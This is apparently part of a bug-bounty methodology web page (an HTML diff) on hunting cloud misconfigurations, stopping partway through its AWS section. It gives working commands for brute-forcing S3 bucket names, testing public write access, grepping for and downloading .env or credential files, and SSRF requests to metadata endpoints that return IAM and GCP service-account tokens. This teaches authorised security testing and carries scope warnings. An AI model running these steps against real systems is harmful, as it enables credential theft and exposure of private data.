+      <span class="md-typeset">
+        Cognito Misconfiguration
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#google-cloud-platform-gcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Google Cloud Platform (GCP)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Google Cloud Platform (GCP)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gcs-bucket-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        GCS Bucket Misconfiguration
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#firebase-exposed-databases" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Firebase Exposed Databases
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gcp-metadata-endpoint" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        GCP Metadata Endpoint
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#microsoft-azure" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Microsoft Azure
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Microsoft Azure">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#azure-blob-storage-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Azure Blob Storage Misconfiguration
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#azure-metadata-endpoint" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Azure Metadata Endpoint
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#generic-cloud-recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Generic Cloud Recon
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Generic Cloud Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cloud-asset-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Cloud Asset Discovery
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nuclei-cloud-templates" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Nuclei Cloud Templates
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kubernetes-and-container-misconfigurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Kubernetes and Container Misconfigurations
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Kubernetes and Container Misconfigurations">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exposed-kubernetes-dashboard" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exposed Kubernetes Dashboard
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unauthenticated-kubelet-api" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Unauthenticated Kubelet API
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssrf-to-internal-kubernetes-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        SSRF to Internal Kubernetes Services
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exposed-services-and-panels" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exposed Services and Panels
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exposed Services and Panels">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exposed-admin-panels-and-internal-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exposed Admin Panels and Internal Tools
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exposed-debug-interfaces" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exposed Debug Interfaces
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exposed-git-and-config-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exposed .git and Config Files
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        References
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+<h1 id="cloud">Cloud<a class="headerlink" href="#cloud" title="Permanent link">&para;</a></h1>
+<p>Cloud misconfigurations sit at the intersection of developer convenience and catastrophic security failure. The attack surface is the entire public internet: S3 buckets, metadata endpoints, unauthenticated databases, admin panels — all reachable without credentials because someone left a door open. The skill is systematic enumeration, not novel exploitation.</p>
+<div class="grid cards">
+<ul>
+<li>
+<p>:simple-amazonaws:{ .lg .middle } <strong>AWS</strong></p>
+<hr />
+<p>S3 bucket enumeration, EC2 metadata credential theft, exposed IAM keys, and Cognito identity pool misconfigurations.</p>
+<p><a href="#aws"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> AWS misconfigs</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.19 2.38a9.344 9.344 0 0 0-9.234 6.893c.053-.02-.055.013 0 0-3.875 2.551-3.922 8.11-.247 10.941l.006-.007-.007.03a6.7 6.7 0 0 0 4.077 1.356h5.173l.03.03h5.192c6.687.053 9.376-8.605 3.835-12.35a9.37 9.37 0 0 0-2.821-4.552l-.043.043.006-.05A9.34 9.34 0 0 0 12.19 2.38m-.358 4.146c1.244-.04 2.518.368 3.486 1.15a5.19 5.19 0 0 1 1.862 4.078v.518c3.53-.07 3.53 5.262 0 5.193h-5.193l-.008.009v-.04H6.785a2.6 2.6 0 0 1-1.067-.23h.001a2.597 2.597 0 1 1 3.437-3.437l3.013-3.012A6.75 6.75 0 0 0 8.11 8.24c.018-.01.04-.026.054-.023a5.19 5.19 0 0 1 3.67-1.69z"/></svg></span> <strong>GCP</strong></p>
+<hr />
+<p>GCS bucket access, open Firebase databases, and service account token extraction via metadata endpoint SSRF.</p>
+<p><a href="#google-cloud-platform-gcp"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> GCP misconfigs</a></p>
+</li>
+<li>
+<p>:simple-microsoftazure:{ .lg .middle } <strong>Azure</strong></p>
+<hr />
+<p>Public blob container enumeration, BlobHunter discovery, and management token extraction via metadata SSRF.</p>
+<p><a href="#microsoft-azure"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Azure misconfigs</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 22v-2h3v-3h2v3.5c0 .39-.16.74-.46 1.04s-.65.46-1.04.46zM7 22H3.5c-.39 0-.74-.16-1.04-.46S2 20.89 2 20.5V17h2v3h3zM17 2h3.5c.39 0 .74.16 1.04.46s.46.65.46 1.04V7h-2V4h-3zM7 2v2H4v3H2V3.5c0-.39.16-.74.46-1.04S3.11 2 3.5 2zm3.5 4C13 6 15 8 15 10.5c0 .88-.25 1.7-.69 2.4l3.26 3.26-1.41 1.41-3.26-3.26c-.7.44-1.52.69-2.4.69C8 15 6 13 6 10.5S8 6 10.5 6m0 2a2.5 2.5 0 0 0 0 5 2.5 2.5 0 0 0 0-5"/></svg></span> <strong>Generic Cloud Recon</strong></p>
+<hr />
+<p>Provider fingerprinting, multi-cloud asset discovery with CloudEnum, and Nuclei template coverage.</p>
+<p><a href="#generic-cloud-recon"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Cloud recon</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m10.204 14.35.007.01-.999 2.413a5.17 5.17 0 0 1-2.075-2.597l2.578-.437.004.005a.44.44 0 0 1 .484.606zm-.833-2.129a.44.44 0 0 0 .173-.756l.002-.011L7.585 9.7a5.14 5.14 0 0 0-.73 3.255l2.514-.725zm1.145-1.98a.44.44 0 0 0 .699-.337l.01-.005.15-2.62a5.14 5.14 0 0 0-3.01 1.442l2.147 1.523zm.76 2.75.723.349.722-.347.18-.78-.5-.623h-.804l-.5.623.179.779zm1.5-3.095a.44.44 0 0 0 .7.336l.008.003 2.134-1.513a5.2 5.2 0 0 0-2.992-1.442l.148 2.615zm10.876 5.97-5.773 7.181a1.6 1.6 0 0 1-1.248.594l-9.261.003a1.6 1.6 0 0 1-1.247-.596l-5.776-7.18a1.58 1.58 0 0 1-.307-1.34L2.1 5.573c.108-.47.425-.864.863-1.073L11.305.513a1.6 1.6 0 0 1 1.385 0l8.345 3.985c.438.209.755.604.863 1.073l2.062 8.955c.108.47-.005.963-.308 1.34m-3.289-2.057c-.042-.01-.103-.026-.145-.034-.174-.033-.315-.025-.479-.038-.35-.037-.638-.067-.895-.148-.105-.04-.18-.165-.216-.216l-.201-.059a6.5 6.5 0 0 0-.105-2.332 6.5 6.5 0 0 0-.936-2.163c.052-.047.15-.133.177-.159.008-.09.001-.183.094-.282.197-.185.444-.338.743-.522.142-.084.273-.137.415-.242.032-.024.076-.062.11-.089.24-.191.295-.52.123-.736s-.506-.236-.745-.045c-.034.027-.08.062-.111.088-.134.116-.217.23-.33.35-.246.25-.45.458-.673.609-.097.056-.239.037-.303.033l-.19.135a6.55 6.55 0 0 0-4.146-2.003l-.012-.223c-.065-.062-.143-.115-.163-.25-.022-.268.015-.557.057-.905.023-.163.061-.298.068-.475.001-.04-.001-.099-.001-.142 0-.306-.224-.555-.5-.555-.275 0-.499.249-.499.555l.001.014c0 .041-.002.092 0 .128.006.177.044.312.067.475.042.348.078.637.056.906a.55.55 0 0 1-.162.258l-.012.211a6.42 6.42 0 0 0-4.166 2.003l-.18-.128c-.09.012-.18.04-.297-.029-.223-.15-.427-.358-.673-.608-.113-.12-.195-.234-.329-.349l-.111-.088a.6.6 0 0 0-.348-.132.48.48 0 0 0-.398.176c-.172.216-.117.546.123.737l.007.005.104.083c.142.105.272.159.414.242.299.185.546.338.743.522.076.082.09.226.1.288l.16.143a6.46 6.46 0 0 0-1.02 4.506l-.208.06c-.055.072-.133.184-.215.217-.257.081-.546.11-.895.147-.164.014-.305.006-.48.039-.037.007-.09.02-.133.03l-.004.002-.007.002c-.295.071-.484.342-.423.608.061.267.349.429.645.365l.007-.001.01-.003.129-.029c.17-.046.294-.113.448-.172.33-.118.604-.217.87-.256.112-.009.23.069.288.101l.217-.037a6.5 6.5 0 0 0 2.88 3.596l-.09.218c.033.084.069.199.044.282-.097.252-.263.517-.452.813-.091.136-.185.242-.268.399-.02.037-.045.095-.064.134-.128.275-.034.591.213.71.248.12.556-.007.69-.282v-.002c.02-.039.046-.09.062-.127.07-.162.094-.301.144-.458.132-.332.205-.68.387-.897.05-.06.13-.082.215-.105l.113-.205a6.45 6.45 0 0 0 4.609.012l.106.192c.086.028.18.042.256.155.136.232.229.507.342.84.05.156.074.295.145.457.016.037.043.09.062.129.133.276.442.402.69.282.247-.118.341-.435.213-.71-.02-.039-.045-.096-.065-.134-.083-.156-.177-.261-.268-.398-.19-.296-.346-.541-.443-.793-.04-.13.007-.21.038-.294-.018-.022-.059-.144-.083-.202a6.5 6.5 0 0 0 2.88-3.622c.064.01.176.03.213.038.075-.05.144-.114.28-.104.266.039.54.138.87.256.154.06.277.128.448.173.036.01.088.019.13.028l.009.003.007.001c.297.064.584-.098.645-.365.06-.266-.128-.537-.423-.608M16.4 9.701l-1.95 1.746v.005a.44.44 0 0 0 .173.757l.003.01 2.526.728a5.2 5.2 0 0 0-.108-1.674A5.2 5.2 0 0 0 16.4 9.7zm-4.013 5.325a.44.44 0 0 0-.404-.232.44.44 0 0 0-.372.233h-.002l-1.268 2.292a5.16 5.16 0 0 0 3.326.003l-1.27-2.296zm1.888-1.293a.44.44 0 0 0-.27.036.44.44 0 0 0-.214.572l-.003.004 1.01 2.438a5.15 5.15 0 0 0 2.081-2.615l-2.6-.44z"/></svg></span> <strong>Kubernetes</strong></p>
+<hr />
+<p>Exposed dashboards, unauthenticated Kubelet APIs, and SSRF paths into internal cluster services.</p>
+<p><a href="#kubernetes-and-container-misconfigurations"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Kubernetes</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 16V4H3v12zm0-14a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2h-7v2h2v2H8v-2h2v-2H3a2 2 0 0 1-2-2V4c0-1.11.89-2 2-2zM5 6h9v5H5zm10 0h4v2h-4zm4 3v5h-4V9zM5 12h4v2H5zm5 0h4v2h-4z"/></svg></span> <strong>Exposed Services</strong></p>
+<hr />
+<p>Elasticsearch, Redis, MongoDB, Jenkins, Jupyter, Spring Boot Actuator, and debug mode exposures.</p>
+<p><a href="#exposed-services-and-panels"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Exposed services</a></p>
+</li>
+</ul>
+</div>
+<h2 id="decision-flow">Decision Flow<a class="headerlink" href="#decision-flow" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Target runs on AWS (amazonaws.com CNAMEs, CloudFront, ELB)?
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>→ Enumerate S3 buckets using naming patterns + S3Scanner.
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>→ Check DNS for CNAMEs pointing to s3.amazonaws.com — NoSuchBucket = takeover candidate.
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Found SSRF on an AWS-hosted target?
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>→ Hit http://169.254.169.254/latest/meta-data/iam/security-credentials/ for IAM role credentials.
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>→ Validate stolen creds with aws sts get-caller-identity, then enumerate read-only.
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>Found AWS keys in JS, .env, or GitHub?
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>→ Validate the key prefix (AKIA/ASIA), call sts get-caller-identity, enumerate with enumerate-iam.
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>→ Report key ID prefix + account output only — do not exercise write permissions.
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>Target uses Firebase or GCP?
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>→ Extract projectId from JS firebaseConfig, hit &lt;project&gt;.firebaseio.com/.json.
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>→ For GCP SSRF: hit metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token.
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>Target exposes non-standard ports (httpx scan)?
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>→ Check 9200 (Elasticsearch), 6379 (Redis), 27017 (MongoDB), 3000 (Grafana), 8080 (Jenkins), 8888 (Jupyter).
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>→ Each has unauthenticated-by-default configurations to probe.
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>Target runs Kubernetes?
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>→ Port scan for 6443, 8001, 10250, 10255 on discovered IPs and subdomain ranges.
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>→ Unauthenticated /api/v1/pods or /api/v1/namespaces/default/secrets = Critical.
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>Not sure what cloud infrastructure is in scope?
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>→ Run CloudEnum with the target keyword, check httpx output for cloud provider hostnames.
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>→ Run Nuclei with exposures/, misconfiguration/, and cloud/ template categories.
+</span></code></pre></div>
+<hr />
+<h2 id="aws">AWS<a class="headerlink" href="#aws" title="Permanent link">&para;</a></h2>
+<h3 id="s3-bucket-enumeration">S3 Bucket Enumeration<a class="headerlink" href="#s3-bucket-enumeration" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Any AWS-hosted target, or when DNS recon reveals CNAMEs pointing to <code>s3.amazonaws.com</code>.</p>
+<p>S3 buckets follow predictable naming conventions derived from the target company name. Enumerate variations first, then validate access level. Public <code>ListBucket</code> is Medium; public read or write is Critical.</p>
+<div class="language-bash highlight"><span class="filename">s3_bucket_enum.sh</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Common naming patterns to brute-force:</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c1"># target.com, target-com, targetcom, target-assets, target-static,</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c1"># target-media, target-uploads, target-backup, target-logs,</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># target-dev, target-staging, target-prod, target-data, target-cdn</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="c1"># S3Scanner: checks existence and permissions</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>s3scanner<span class="w"> </span>scan<span class="w"> </span>--buckets-file<span class="w"> </span>buckets.txt
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>s3scanner<span class="w"> </span>scan<span class="w"> </span>--bucket<span class="w"> </span>target-backup
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="c1"># CloudBrute: broader multi-cloud asset discovery</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>cloudbrute<span class="w"> </span>-d<span class="w"> </span>target.com<span class="w"> </span>-k<span class="w"> </span>target<span class="w"> </span>-m<span class="w"> </span>s3<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="w">  </span>-w<span class="w"> </span>/opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="c1"># Validate access level via AWS CLI (unauthenticated):</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>aws<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>s3://target-backup<span class="w"> </span>--no-sign-request<span class="w">           </span><span class="c1"># public read?</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>aws<span class="w"> </span>s3<span class="w"> </span>cp<span class="w"> </span>/tmp/test.txt<span class="w"> </span>s3://target-backup/<span class="w"> </span>--no-sign-request<span class="w">  </span><span class="c1"># public write?</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>aws<span class="w"> </span>s3api<span class="w"> </span>get-bucket-acl<span class="w"> </span>--bucket<span class="w"> </span>target-backup<span class="w"> </span>--no-sign-request
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>aws<span class="w"> </span>s3api<span class="w"> </span>get-bucket-policy<span class="w"> </span>--bucket<span class="w"> </span>target-backup<span class="w"> </span>--no-sign-request
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">s3_contents_enum.sh</span><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Flag CNAMEs pointing at S3 during DNS recon:</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>grep<span class="w"> </span><span class="s2">&quot;s3.amazonaws.com&quot;</span><span class="w"> </span>dns_cnames.txt
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># NoSuchBucket response = bucket name exists but unclaimed = takeover candidate</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># XML listing response = public ListBucket access confirmed</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="c1"># High-value file patterns inside a readable bucket:</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>aws<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>s3://target-backup/<span class="w"> </span>--recursive<span class="w"> </span>--no-sign-request<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-100
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>aws<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>s3://target-backup/<span class="w"> </span>--recursive<span class="w"> </span>--no-sign-request<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">  </span>grep<span class="w"> </span>-iE<span class="w"> </span><span class="s2">&quot;(\.env|config|credentials|password|secret|private|key|backup|dump|\.sql|\.bak)&quot;</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>aws<span class="w"> </span>s3<span class="w"> </span>cp<span class="w"> </span>s3://target-backup/.env<span class="w"> </span>/tmp/target_env<span class="w"> </span>--no-sign-request
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Access Level</th>
+<th>Severity</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Public <code>ListBucket</code> only (filenames visible)</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>Public read (files readable)</td>
+<td>High</td>
+</tr>
+<tr>
+<td>Sensitive data in readable bucket</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>Public write or delete access</td>
+<td>Critical</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>Do not download bulk data. Copy one representative file to confirm read access, then stop. Bulk exfiltration of production data exceeds the scope of most programs.</p>
+</div>
+<hr />
+<h3 id="ec2-metadata-via-ssrf">EC2 Metadata via SSRF<a class="headerlink" href="#ec2-metadata-via-ssrf" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Any SSRF vulnerability on an AWS-hosted target. See <a href="../">Part 5 — SSRF</a> for full exploitation methodology.</p>
+<div class="language-bash highlight"><span class="filename">aws_metadata_endpoints.sh</span><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># IMDSv1 requires no authentication header:</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>http://169.254.169.254/latest/meta-data/
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>http://169.254.169.254/latest/user-data<span class="w">        </span><span class="c1"># often contains hardcoded secrets</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>http://169.254.169.254/latest/meta-data/local-ipv4
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="c1"># After credential theft — validate and enumerate read-only:</span>
